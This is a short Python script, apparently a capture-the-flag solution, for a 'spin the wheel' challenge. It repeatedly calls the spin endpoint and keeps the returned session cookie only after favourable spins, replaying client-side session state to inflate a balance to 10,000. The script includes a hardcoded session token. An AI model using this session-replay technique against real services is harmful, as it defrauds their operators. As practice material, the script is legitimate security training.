import requests
import time
import json

# URL et en-têtes de base
url = 'https://spinthewheel.c.unitedctf.ca/spin'
headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'fr-FR,fr;q=0.7',
    'dnt': '1',
    'origin': 'https://spinthewheel.c.unitedctf.ca',
    'referer': 'https://spinthewheel.c.unitedctf.ca/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
}

# Initialise les cookies
cookies = {'session': 'eyJiYWxhbmNlIjoyOCwidWlkIjp7IiB1IjoiZDM1MmNhMzJjMDk0NDNiNTg4NjVhMTM3OTk1ZWY3MDgifX0.ZuWe_g.f1riQEft3h2WaokAyQoZtDeZSp0'}

def spin_wheel():
    global cookies
    response = requests.post(url, headers=headers, cookies=cookies)
    balance = 0

    # Vérifie la réponse
    if response.status_code == 200:
        data = response.json()
        # Si la réponse contient un nouveau solde, met à jour les cookies
        if 'new_balance' in data and data['new_balance'] > 0:
            # Enregistre le cookie (ici, on simule la mise à jour)

            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                new_session_cookie = set_cookie_header.split(';')[0].split('=')[1]
                cookies['session'] = new_session_cookie
                balance = data['new_balance']
                print(f"Solde mis à jour: {balance}")
    else:
        print(f"Erreur {response.status_code}: {response.text}")
    return balance

balance_value = 0
while balance_value < 10000:
    balance_value = spin_wheel()
print(cookies["session"])